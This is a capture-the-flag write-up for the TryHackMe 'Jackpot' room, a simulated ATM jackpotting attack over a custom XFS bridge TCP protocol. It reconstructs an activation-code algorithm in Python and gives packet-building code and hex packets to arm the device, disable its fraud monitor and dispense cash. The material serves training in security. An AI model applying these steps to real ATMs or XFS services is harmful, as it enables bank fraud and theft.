# TryHackMe — Jackpot

## 1. Introduction

The objective of this room is to interact with an ATM-like device through a custom TCP service implementing an XFS bridge protocol.

Instead of exploiting a traditional web application or vulnerable system binary, the challenge requires understanding a custom binary protocol, reverse-engineering an activation utility, and sending correctly formatted commands to the service.

## 2. Service Enumeration

The service was accessible on TCP port `9100`.

After establishing a connection, the server returned a JSON banner describing the protocol and available message types.

The request format was:

```text
1 byte  - Message type
4 bytes - Command ID (Big Endian)
2 bytes - Payload length (Big Endian)
N bytes - Payload
```

The response format was:

```text
2 bytes - Response length (Big Endian)
N bytes - JSON response
```

The service supported two message types:

| Message type | Value  | Description          |
| ------------ | ------ | -------------------- |
| GETINFO      | `0x01` | Retrieve information |
| EXECUTE      | `0x02` | Execute a command    |

The banner also provided an important hint: querying command `0x0304` (`WFS_INF_CDM_CAPABILITIES`) would reveal the available command table.

## 3. Querying Device Capabilities

I sent a GETINFO request for command `0x0304`:

```text
01 00 00 03 04 00 00
```

The response revealed the available commands:

| Command                    | ID       |
| -------------------------- | -------- |
| WFS_INF_CDM_STATUS         | `0x0301` |
| WFS_INF_CDM_CASH_UNIT_INFO | `0x0303` |
| WFS_INF_CDM_CAPABILITIES   | `0x0304` |
| WFS_CMD_CDM_DISPENSE       | `0x0401` |
| WFS_CMD_CDM_ARM            | `0x04F0` |
| WFS_CMD_CDM_SET_MONITOR    | `0x04F1` |
| WFS_CMD_CDM_GET_FLAG       | `0x04FF` |

The device also reported a maximum dispense limit of 40 notes per operation.

## 4. Reverse Engineering the Activation Utility

The challenge provided an executable named `jackpot`.

I inspected its strings:

```bash
strings jackpot
```

Among the output, I found:

```text
ENBANK
[*] session nonce : %s
[*] activation code: %08u
Earth's National Bank - Terminal Engineering Tool
usage: %s <6-digit session code from ATM screen>
```

This indicated that the utility generated an eight-digit activation code from a six-digit session nonce.

I then inspected the executable using:

```bash
objdump -d -M intel jackpot
```

By analysing the relevant instructions, I reconstructed the activation algorithm in Python:

```python
def generate_code(nonce):
    prime = 0x100000001b3
    mask = 0xffffffffffffffff
    h = 0xcbf29ce484222325

    for byte in nonce.encode():
        h = ((h ^ byte) * prime) & mask

    for byte in b"ENBANK":
        h = ((h ^ byte) * prime) & mask
        h ^= h >> 29

    return h % 100000000


nonce = "YOUR_NONCE"
print(f"{generate_code(nonce):08d}")
```

This allowed me to reproduce the activation code without relying on the original utility.

## 5. Building a Python TCP Client

I created separate Python scripts to communicate with the service.

First, I implemented two helper functions to handle protocol framing:

```python
import socket
import struct


def recv_exact(sock, size):
    data = b""

    while len(data) < size:
        chunk = sock.recv(size - len(data))

        if not chunk:
            raise ConnectionError("Server closed connection")

        data += chunk

    return data


def recv_frame(sock):
    length = struct.unpack(">H", recv_exact(sock, 2))[0]
    return recv_exact(sock, length)
```

`recv_exact()` ensures that the requested number of bytes is received, even if the data arrives in multiple TCP segments.

`recv_frame()` reads the two-byte Big Endian length prefix and then retrieves the complete response.

Each script followed the same general structure:

1. Connect to the TCP service.
2. Receive and decode the server banner.
3. Construct a request packet.
4. Send the packet.
5. Receive and display the response.

## 6. Session Activation — ARM

To activate the device, I used command `0x04F0` with the activation code as an ASCII payload.

```python
activation_code = "79340108"
data = activation_code.encode("ascii")

packet = (
    struct.pack(">B", 0x02) +
    struct.pack(">I", 0x04F0) +
    struct.pack(">H", len(data)) +
    data
)
```

The resulting packet contained:

```text
02 00 00 04 f0 00 08 37 39 33 34 30 31 30 38
```

- `02` — EXECUTE message type.
- `00 00 04 f0` — ARM command ID.
- `00 08` — payload length (8 bytes).
- Remaining bytes — activation code in ASCII.

The server response confirmed whether activation was successful.

## 7. Disabling the Fraud Monitor — SET_MONITOR

After activating the device, I disabled the fraud monitor using command `0x04F1`.

The payload was the ASCII string `off`:

```python
data = b"off"

packet = (
    struct.pack(">B", 0x02) +
    struct.pack(">I", 0x04F1) +
    struct.pack(">H", len(data)) +
    data
)
```

The resulting packet:

```text
02 00 00 04 f1 00 03 6f 66 66
```

The expected response was:

```json
{
    "rc": "WFS_SUCCESS",
    "monitor_on": false
}
```

Disabling the monitor was important because the fraud protection mechanism could lock the device after detecting anomalous dispense operations.

## 8. Dispensing Cash — DISPENSE

Next, I used command `0x0401` to dispense cash.

In my implementation, the requested note count was sent as an ASCII string:

```python
data = b"20"

packet = (
    struct.pack(">B", 0x02) +
    struct.pack(">I", 0x0401) +
    struct.pack(">H", len(data)) +
    data
)
```

The packet structure was:

```text
02 00 00 04 01 00 02 32 30
```

- `02` — EXECUTE.
- `00 00 04 01` — DISPENSE command ID.
- `00 02` — payload length.
- `32 30` — ASCII representation of `20`.

The device allowed a maximum of 40 notes per operation.

## 9. Retrieving the Flag — GET_FLAG

After completing the required cash dispensing operations, I requested the flag using command `0x04FF`.

```python
data = b""

packet = (
    struct.pack(">B", 0x02) +
    struct.pack(">I", 0x04FF) +
    struct.pack(">H", len(data)) +
    data
)
```

The resulting packet:

```text
02 00 00 04 ff 00 00
```

The response contained the flag.

## 10. Conclusion

This room demonstrates how understanding a custom binary protocol can be more important than using standard exploitation tools.

The key steps were:

- Analysing the service banner and discovering available commands.
- Understanding Big Endian packet formatting and TCP response framing.
- Reverse-engineering the activation utility.
- Reimplementing its algorithm in Python.
- Building a client to interact with the XFS bridge.
- Activating the device and disabling its fraud monitor.
- Executing the required dispense operations and retrieving the flag.

The most important part of the challenge was understanding how to construct valid binary requests rather than relying on ready-made exploitation tools.
